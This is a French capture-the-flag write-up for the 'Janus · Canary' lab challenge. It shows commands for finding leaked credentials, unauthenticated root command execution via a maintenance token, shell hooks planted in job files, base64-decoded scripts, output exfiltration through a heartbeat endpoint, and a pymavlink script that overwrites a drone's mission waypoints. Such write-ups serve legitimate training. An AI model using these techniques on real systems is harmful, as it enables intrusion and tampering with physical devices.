---
title: "Janus · Canary"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "misc"
difficulty: "—"
points: 200
os: "—"
date: 2026-11-20
author: "H4ckd4ne"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/janus/canary/writeup-canary-janus.md"
license: "CC BY-SA 4.0"
status: published
---

# Canary — Janus / update.nrv (Misc, 200 pts)

## Objectif

Neutraliser le dead-man's switch du « Centre de diffusion JANUS » avant
l'échéance : couper les 5 canaux de presse et dérouter le drone NRV-RAVEN
(MAVLink) vers la zone de repli. Le checker ne rend le verdict et n'écrit le
flag qu'à la fin du compte à rebours.

Cible : `http://172.28.12.2:80` (l'IP change à chaque instance ; adapter
`$TARGET`).

```bash
TARGET=172.28.12.2
```

## 1. Reconnaissance

Le seul endpoint public riche est la télémétrie :

```bash
curl -s "http://$TARGET/api/telemetry" | jq
```

On y voit le drone (`release: ARMED`, `dropzone: [46.2103,6.1502]`), la fuite
armée sur 5 canaux, et la zone de repli `safe_coord: 46.045,5.87`.

Un fuzz de la racine sort `/.DS_Store` (hors whitelist d'auth) :

```bash
ffuf -s -u "http://$TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 302,404
# -> favicon.ico, health
```

Le `.DS_Store` révèle les fichiers cachés :

```bash
curl -s "http://$TARGET/.DS_Store" -o ds
strings -e b -n 3 ds
# app.js, console.js, favicon.ico, logo-norsec.png, style.css,
# architecture-infra-janus-v3.pdf
```

Le PDF d'architecture est public :

```bash
curl -s -O "http://$TARGET/architecture-infra-janus-v3.pdf"
pdftotext -layout architecture-infra-janus-v3.pdf -
```

Il contient deux choses décisives :

- le compte admin par défaut : `admin / R3lay#JANUS-N0rv3th_2026` (lecture seule) ;
- l'existence d'un miroir PyPI interne proxifié par le relais sur
  `/pypi/simple/` (paquets maison `corp-auth`, `corp-logging`, `corp-utils`).

## 2. Accès initial — RCE root via corp-auth

Le miroir expose les paquets :

```bash
curl -s "http://$TARGET/pypi/simple/"
# corp-auth/  corp-logging/  corp-utils/
```

Attention : les liens du simple index pointent vers `/packages/...` qui renvoie
404. Les fichiers réels sont sous `/pypi/packages/` :

```bash
curl -s "http://$TARGET/pypi/packages/corp_auth-1.2.0.tar.gz" | tar xz
sed -n '1,220p' corp_auth-1.2.0/corp_auth/middleware.py
```

Le middleware fuit :

```python
_SSO_SECRET = 'K7x$mQ9_corp_internal_2026'
_MAINT_HASH = hashlib.sha256(
    f'{_SSO_SECRET}::maintenance'.encode()
).hexdigest()[:32]
```

et enregistre `/_internal/diag` **avant** le contrôle de session. L'endpoint
accepte `action=exec` avec le header `X-Maint-Token: <_MAINT_HASH>`, donc un RCE
root non authentifié :

```bash
TOK=$(python3 - <<'PY'
import hashlib
print(hashlib.sha256(b'K7x$mQ9_corp_internal_2026::maintenance').hexdigest()[:32])
PY
)
# 5f242c100e9970cee9aa2a83cba80861

curl -s -H "X-Maint-Token: $TOK" \
  "http://$TARGET/_internal/diag?action=exec&cmd=id"
# uid=0(root)
```

## 3. Comprendre le checker

Le verdict est dans `/verdict/status.json` (volume monté en lecture seule côté
relais) :

```json
{"remaining": 515, "channels_safe": true, "drone_safe": true,
 "verdict": "ARMED", "safe_coord": "46.045,5.87"}
```

Le flag n'est écrit dans `/verdict/flag` que lorsque `remaining = 0` **et** que
`channels_safe` et `drone_safe` sont vrais. Le checker calcule :

- `channels_safe` : plus aucune ligne `alert_channels.active = TRUE` pour
  l'alerte armée ;
- `drone_safe` : à partir de la **vraie mission MAVLink** du drone, pas du
  fichier `telemetry.json` du relais. Le fichier de télémétrie est un leurre :
  le falsifier ne change pas le verdict.

Le poste terrain `NRV-FIELD-042` lit la mission du drone avec `pymavlink`
(`udpout:drone:14550`) et calcule :

```python
terminal = ordered[-1]
dist = haversine(terminal, PRESS_DROPZONE)  # (46.2103, 6.1502)
diverted = dist >= CLEARANCE_M             # 300 m
release = "ABORT" if diverted else "ARMED"
bay = "DÉROUTÉE" if diverted else "SCELLÉE"
```

Il faut donc que le dernier waypoint de la mission soit à au moins 300 m du
corridor de presse (idéalement la zone de repli `46.045,5.87`).

## 4. Neutraliser les canaux

Les creds DB sont dans l'environnement du relais (`DB_USER=relay`,
`DB_PASS=r3lay-NRV-2026!`, `DB_NAME=janus_relay`, `DB_HOST=db`) :

```sql
UPDATE alert_channels SET active = FALSE WHERE alert_id = 2;
UPDATE channels SET enabled = FALSE;
```

On peut le faire via la RCE et `psycopg2`, ou via l'UI avec la clé de service
(qui n'est stockée que hachée, donc l'accès serveur est plus simple).

## 5. Neutraliser le drone — upload de mission MAVLink

Le poste terrain exécute les hooks des jobs JSON déposés dans
`/opt/webapp/jobs/` :

```json
{"id":"job-cargo-002","agent":"NRV-FIELD-042","type":"cargo_prep",
 "name":"divert","hook":"<commande shell>","status":"pending"}
```

Le job est récupéré par `GET /api/field/jobs?agent=NRV-FIELD-042`, puis
`field_agent.py` exécute `subprocess.run(hook, shell=True)`. On obtient donc un
RCE sur le poste terrain, qui a `pymavlink` et l'accès à `drone:14550`.

Le piège : le SITL refuse un remplacement de mission avec un `count` arbitraire
(il ACK mais garde l'ancienne mission). Il faut lire le `count` courant (4) et
réuploader 4 waypoints, tous placés sur la zone de repli pour que le terminal
reste sûr même quand le drone progresse en AUTO :

```python
from pymavlink import mavutil

m = mavutil.mavlink_connection(
    "udpout:drone:14550", dialect="common",
    source_system=255, source_component=190)
m.wait_heartbeat(timeout=5)

wps = [(46.045, 5.87, 100.0)] * 4
m.mav.mission_count_send(m.target_system, m.target_component, len(wps))

sent = set()
while len(sent) < len(wps):
    msg = m.recv_match(type=['MISSION_REQUEST_INT', 'MISSION_REQUEST',
                             'MISSION_ACK'], blocking=True, timeout=5)
    if msg is None:
        break
    if msg.get_type() == 'MISSION_ACK':
        break
    seq = msg.seq
    if seq in sent:
        continue
    lat, lon, alt = wps[seq]
    m.mav.mission_item_int_send(
        m.target_system, m.target_component, seq,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
        0, 1, 0, 0, 0, 0,
        int(lat * 1e7), int(lon * 1e7), alt)
    sent.add(seq)
```

Le hook peut écrire ce script en base64 puis l'exécuter :

```bash
echo <base64_du_script> | base64 -d > /tmp/divert.py
python3 /tmp/divert.py
```

### Exfiltrer la sortie du poste terrain

L'ack `/api/field/jobs/<id>/ack` exige une session : l'ack natif du poste
terrain est redirigé vers `/login` et l'output est perdu. Deux contournements :

- **Heartbeat** (pas d'auth) : le hook poste sa sortie dans le champ `version`
  de `/api/field/heartbeat`, puis on lit `agents.current_version` en DB :

```bash
curl -s -X POST "http://10.96.15.5/api/field/heartbeat" \
  -H 'Content-Type: application/json' \
  -d '{"agent_id":"NRV-FIELD-042","version":"<base64_output>"}'
```

- **Ack avec cookie admin** : le hook poste sur
  `/api/field/jobs/<id>/ack` avec `Cookie: session=<cookie_admin>` ; l'app
  stocke alors `output` dans le fichier du job.

## 6. Vérification

Après l'upload, la télémétrie du relais doit passer à :

```json
{"bay": "DÉROUTÉE", "diverted": true, "release": "ABORT",
 "terminal": [46.045, 5.87], "dist_to_dropzone": 28357}
```

et `/verdict/status.json` à :

```json
{"channels_safe": true, "drone_safe": true, "remaining": 525,
 "verdict": "ARMED", "safe_coord": "46.045,5.87"}
```

Le `verdict` reste `ARMED` tant que `remaining > 0` : c'est normal. Il passe à
`SAFE`/`DEFUSED` à l'échéance et le checker écrit `/verdict/flag`. Il suffit de
maintenir l'état (canaux inactifs + mission déroutée) jusqu'à `remaining = 0`.

## 7. Pièges

- `/.DS_Store` est servi hors whitelist : il liste les fichiers publics.
- Les liens du simple index PyPI sont faux (`/packages/...` → 404) ; utiliser
  `/pypi/packages/...`.
- `telemetry.json` est un leurre : le checker lit la mission MAVLink réelle.
- Le SITL peut ACK un `mission_count` arbitraire sans changer la mission : lire
  le count courant et réuploader le même nombre d'items.
- L'ack du poste terrain est bloqué par l'auth ; utiliser le heartbeat ou un
  cookie admin.
- Le flag n'est pas écrit dès que `channels_safe`/`drone_safe` passent à true :
  il faut attendre `remaining = 0`.
- L'IP de la cible et les identifiants sont régénérés à chaque instance.

## 8. Validation reproductible

1. `curl -s "http://$TARGET/api/telemetry" | jq` : vérifier `verdict` et
   `safe_coord`.
2. `curl -s -H "X-Maint-Token: $TOK" ".../_internal/diag?action=exec&cmd=id"` :
   `uid=0(root)`.
3. SQL : `SELECT COUNT(*) FROM alert_channels WHERE active = TRUE;` → `0`.
4. `pymavlink` : le dernier waypoint de la mission est `46.045,5.87` et
   `dist_to_dropzone > 300`.
5. `cat /verdict/status.json` : `channels_safe: true`, `drone_safe: true`.
6. À `remaining = 0`, `cat /verdict/flag` : le flag est écrit (non recopié ici).
